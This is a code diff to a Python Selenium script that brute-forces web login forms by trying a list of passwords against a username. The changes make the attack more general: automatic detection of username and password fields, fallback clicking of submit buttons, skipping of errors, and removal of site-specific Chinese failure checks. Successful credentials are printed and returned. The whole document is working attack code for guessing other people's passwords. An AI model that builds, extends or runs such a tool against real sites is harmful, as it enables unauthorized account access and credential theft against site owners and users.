@@ -26,6 +26,40 @@ def find_login_fields(driver):
             break
     return username_field, password_field
 
+def find_all_login_field_combinations(driver):
+    """
+    Find all possible (username/email, password) field pairs on the page.
+    Return a list of (username_field, password_field) tuples.
+    """
+    password_fields = driver.find_elements(By.XPATH, "//input[@type='password']")
+    if not password_fields:
+        return []
+    all_inputs = driver.find_elements(By.XPATH, "//input")
+    username_candidates = []
+    for el in all_inputs:
+        t = (el.get_attribute("type") or "").lower()
+        n = (el.get_attribute("name") or "").lower()
+        i = (el.get_attribute("id") or "").lower()
+        p = (el.get_attribute("placeholder") or "").lower()
+        a = (el.get_attribute("aria-label") or "").lower()
+        # Check for common username/email keywords
+        if (
+            t in ["text", "email"] or
+            any(k in n for k in ["user", "email", "login", "account"]) or
+            any(k in i for k in ["user", "email", "login", "account"]) or
+            any(k in p for k in ["user", "email", "login", "account"]) or
+            any(k in a for k in ["user", "email", "login", "account"])
+        ):
+            username_candidates.append(el)
+    combinations = []
+    for pwd_field in password_fields:
+        for uname_field in username_candidates:
+            if uname_field != pwd_field:
+                combinations.append((uname_field, pwd_field))
+        # Also support password-only login
+        combinations.append((None, pwd_field))
+    return combinations
+
 def brute_force(url, username, password_list, delay=2, success_url=None, verbose=True):
     """
     Try all passwords in password_list on the given url with the given username.
@@ -48,10 +82,16 @@ def brute_force(url, username, password_list, delay=2, success_url=None, verbose
                     print("Could not find password field.")
                     break
                 if username_field:
-                    username_field.clear()
-                    username_field.send_keys(uname)
-                password_field.clear()
-                password_field.send_keys(pwd)
+                    try:
+                        username_field.clear()
+                        username_field.send_keys(uname)
+                    except Exception:
+                        continue  # Skip if username field not interactable
+                try:
+                    password_field.clear()
+                    password_field.send_keys(pwd)
+                except Exception:
+                    continue  # Skip if password field not interactable
                 # Fully automatic submit button detection and click
                 try:
                     # Collect all candidate submit buttons
@@ -94,7 +134,8 @@ def brute_force(url, username, password_list, delay=2, success_url=None, verbose
                         driver.quit()
                         return (uname, pwd)
                 else:
-                    if url not in driver.current_url and "访问验证" not in driver.page_source and "密码错误" not in driver.page_source:
+                    # Only check if URL changed or generic error message (no Chinese)
+                    if url not in driver.current_url:
                         print(f"Login success! Username: {uname} Password: {pwd}")
                         driver.quit()
                         return (uname, pwd)
@@ -103,33 +144,67 @@ def brute_force(url, username, password_list, delay=2, success_url=None, verbose
         return None
     # Default: username is str or None, password_list is iterable
     for pwd in password_list:
-        if verbose:
-            print(f"Trying password: {pwd}")
-        driver.get(url)
-        time.sleep(1)
-        username_field, password_field = find_login_fields(driver)
-        if not password_field:
-            print("Could not find password field.")
-            break
-        if username_field and username is not None:
-            username_field.clear()
-            username_field.send_keys(username)
-        password_field.clear()
-        password_field.send_keys(pwd)
+        # Progress display logic (if needed, pass in current/total from caller)
+        # try to fill username and password fields, skip if not interactable
         try:
-            submit_btn = driver.find_element(By.XPATH, "//button[contains(text(),'提交')]")
-            submit_btn.click()
+            driver.get(url)
+            time.sleep(1)
+            username_field, password_field = find_login_fields(driver)
+            if not password_field:
+                print("Could not find password field.")
+                break
+            if username_field and username is not None:
+                try:
+                    username_field.clear()
+                    username_field.send_keys(username)
+                except Exception:
+                    continue  # Skip if username field not interactable
+            try:
+                password_field.clear()
+                password_field.send_keys(pwd)
+            except Exception:
+                continue  # Skip if password field not interactable
+        except Exception:
+            continue  # Skip this attempt if any error
+        # (Do not print each password, only show progress in CLI)
+        try:
+            # Collect all candidate submit buttons
+            candidates = []
+            candidates += driver.find_elements(By.TAG_NAME, 'button')
+            candidates += driver.find_elements(By.XPATH, "//input[@type='submit']")
+            filtered = []
+            for el in candidates:
+                try:
+                    v = (el.get_attribute('value') or '').lower()
+                    a = (el.get_attribute('aria-label') or '').lower()
+                    i = (el.get_attribute('id') or '').lower()
+                    c = (el.get_attribute('class') or '').lower()
+                    t = (el.text or '').lower()
+                    if any(x in v for x in ['submit','login']) or any(x in a for x in ['submit','login']) or any(x in i for x in ['submit','login']) or any(x in c for x in ['submit','login']) or any(x in t for x in ['submit','login']):
+                        filtered.append(el)
+                except Exception:
+                    continue
+            clicked = False
+            for el in filtered + [e for e in candidates if e not in filtered]:
+                try:
+                    el.click()
+                    clicked = True
+                    break
+                except Exception:
+                    continue
+            if not clicked:
+                password_field.send_keys(Keys.RETURN)
         except Exception:
             password_field.send_keys(Keys.RETURN)
         time.sleep(delay)
         if success_url:
             if driver.current_url.startswith(success_url):
-                print(f"Login success! Password is: {pwd}")
+                print(f"Login success! Username: {username} Password: {pwd}")
                 driver.quit()
                 return pwd
         else:
-            if url not in driver.current_url and "访问验证" not in driver.page_source and "密码错误" not in driver.page_source:
-                print(f"Login success! Password is: {pwd}")
+            if url not in driver.current_url:
+                print(f"Login success! Username: {username} Password: {pwd}")
                 driver.quit()
                 return pwd
     print("All passwords tried, none succeeded.")
